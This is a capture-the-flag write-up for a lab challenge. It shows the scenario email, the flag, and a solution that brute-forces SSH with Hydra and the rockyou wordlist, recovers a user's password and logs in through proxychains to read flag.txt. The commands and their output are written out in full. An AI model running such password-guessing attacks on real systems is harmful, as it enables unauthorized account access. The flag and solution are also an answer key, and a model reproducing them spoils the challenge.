# Merriam-Webster
100

You have found an email, instructing a user that he needs to use a more secure password.

To: bgates@acme.local From: IT Security Team

Subject: Using secure passwords

Bill, Please update your credentials to comply with our company's policy.

The security team noted this as an issue on the CentOS box with address 192.168.x.6

Also, we look forward to seeing you at the end of summer party.

Regards, Belinda

# Flag
```
RTXFLAG{I_Heart_Apple}
```

# Solution
There is an ssh service running on port 22. Let's try a disctionary attack using Hydra.
```
$ hydra -l bgates -P  /usr/share/wordlists/rockyou.txt 192.168.5.6 ssh 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-12 23:42:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.5.6:22/
[STATUS] 465.00 tries/min, 465 tries in 00:01h, 14343934 to do in 514:08h, 16 active
^[[A[STATUS] 481.00 tries/min, 1443 tries in 00:03h, 14342956 to do in 496:60h, 16 active
[STATUS] 460.86 tries/min, 3226 tries in 00:07h, 14341173 to do in 518:39h, 16 active
[STATUS] 464.67 tries/min, 6970 tries in 00:15h, 14337429 to do in 514:16h, 16 active
[STATUS] 463.97 tries/min, 14383 tries in 00:31h, 14330016 to do in 514:46h, 16 active
[STATUS] 463.77 tries/min, 21797 tries in 00:47h, 14322602 to do in 514:44h, 16 active
[STATUS] 464.19 tries/min, 29244 tries in 01:03h, 14315155 to do in 513:59h, 16 active
[STATUS] 464.73 tries/min, 36714 tries in 01:19h, 14307685 to do in 513:07h, 16 active
[STATUS] 464.49 tries/min, 44127 tries in 01:35h, 14300272 to do in 513:07h, 16 active
[STATUS] 464.32 tries/min, 51540 tries in 01:51h, 14292859 to do in 513:03h, 16 active
[STATUS] 463.89 tries/min, 58914 tries in 02:07h, 14285485 to do in 513:15h, 16 active
[22][ssh] host: 192.168.5.6   login: bgates   password: theworldismine
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-13 01:58:32
```

Password Found - theworldismine

SSH into bgates account and get the flag
```
$ proxychains ssh bgates@192.168.5.6
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.5.6:22  ...  OK
bgates@192.168.5.6's password: 
Last login: Mon Sep 13 06:41:58 2021 from 192.168.5.102
[bgates@Acme-Lin1 ~]$ ls
flag.txt
[bgates@Acme-Lin1 ~]$ cat flag.txt
RTXFLAG{I_Heart_Apple}
```